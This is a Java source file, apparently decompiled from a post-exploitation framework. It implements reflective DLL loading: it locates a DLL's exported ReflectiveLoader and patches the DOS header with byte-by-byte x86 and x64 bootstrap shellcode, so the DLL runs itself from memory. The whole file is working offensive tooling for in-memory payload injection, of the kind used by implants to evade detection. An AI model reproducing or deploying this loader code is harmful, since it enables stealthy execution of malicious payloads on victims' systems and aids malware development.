package common;

import common.CommonUtils;
import common.MudgeSanity;
import common.Packer;

import java.util.List;

import pe.PEParser;
public class ReflectiveDLL {

    public static final int EXIT_FUNK_PROCESS = 1453503984;

    public static final int EXIT_FUNK_THREAD = 170532320;

    public static int findReflectiveLoader(byte[] arrby) {
        try {
            PEParser pEParser = PEParser.load(arrby);
            List<String> list = pEParser.getExportedFunctions();
            for (String str : list) {
                if (str.indexOf("ReflectiveLoader") >= 0) {
                    return pEParser.getFunctionOffset(str);
                }
            }
        } catch (Exception exception) {
            MudgeSanity.logException("Could not find Reflective Loader", exception, false);
        }
        return -1;
    }

    public static boolean is64(byte[] arrby) {
        try {
            PEParser pEParser = PEParser.load(arrby);
            return pEParser.is64();
        } catch (Exception exception) {
            MudgeSanity.logException("Could not find parse PE header in binary blob", exception, false);
            return false;
        }
    }

    public static byte[] patchDOSHeader(byte[] arrby) {
        return patchDOSHeader(arrby, 1453503984);
    }

    public static byte[] patchDOSHeader(byte[] arrby, int n) {
        int i = findReflectiveLoader(arrby);
        if (is64(arrby)) {
            throw new RuntimeException("x64 DLL passed to x86 patch function");
        }
        if (i < 0) {
            return new byte[0];
        }
        Packer packer = new Packer();
        packer.little();
        packer.addByte(77);
        packer.addByte(90);
        packer.addByte(232);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(91);
        packer.addByte(82);
        packer.addByte(69);
        packer.addByte(85);
        packer.addByte(137);
        packer.addByte(229);
        packer.addByte(129);
        packer.addByte(195);
        packer.addInt(i - 7);
        packer.addByte(255);
        packer.addByte(211);
        packer.addByte(137);
        packer.addByte(195);
        packer.addByte(87);
        packer.addByte(104);
        packer.addByte(4);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(80);
        packer.addByte(255);
        packer.addByte(208);
        packer.addByte(104);
        packer.addInt(n);
        packer.addByte(104);
        packer.addByte(5);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(80);
        packer.addByte(255);
        packer.addByte(211);
        byte[] bytes = packer.getBytes();
        if (bytes.length > 60) {
            CommonUtils.print_error("bootstrap length is: " + bytes.length
                    + " (it's too big!)");
            return new byte[0];
        }
        for (int b = 0; b < bytes.length; b++) {
            arrby[b] = bytes[b];
        }
        return arrby;
    }

    public static byte[] patchDOSHeaderX64(byte[] arrby) {
        return patchDOSHeaderX64(arrby, 1453503984);
    }

    public static byte[] patchDOSHeaderX64(byte[] arrby, int n) {
        int i = findReflectiveLoader(arrby);
        if (!is64(arrby)) {
            throw new RuntimeException("x86 DLL passed to x64 patch function");
        }
        if (i < 0) {
            return new byte[0];
        }
        Packer packer = new Packer();
        packer.little();
        packer.addByte(77);
        packer.addByte(90);
        packer.addByte(65);
        packer.addByte(82);
        packer.addByte(85);
        packer.addByte(72);
        packer.addByte(137);
        packer.addByte(229);
        packer.addByte(72);
        packer.addByte(129);
        packer.addByte(236);
        packer.addByte(32);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(72);
        packer.addByte(141);
        packer.addByte(29);
        packer.addByte(234);
        packer.addByte(255);
        packer.addByte(255);
        packer.addByte(255);
        packer.addByte(72);
        packer.addByte(129);
        packer.addByte(195);
        packer.addInt(i);
        packer.addByte(255);
        packer.addByte(211);
        packer.addByte(72);
        packer.addByte(137);
        packer.addByte(195);
        packer.addByte(73);
        packer.addByte(137);
        packer.addByte(248);
        packer.addByte(104);
        packer.addByte(4);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(90);
        packer.addByte(255);
        packer.addByte(208);
        packer.addByte(65);
        packer.addByte(184);
        packer.addInt(n);
        packer.addByte(104);
        packer.addByte(5);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(90);
        packer.addByte(255);
        packer.addByte(211);
        byte[] bytes = packer.getBytes();
        if (bytes.length > 60) {
            CommonUtils.print_error("bootstrap length is: " + bytes.length
                    + " (it's too big!)");
            return new byte[0];
        }
        for (int b = 0; b < bytes.length; b++) {
            arrby[b] = bytes[b];
        }
        return arrby;
    }
}
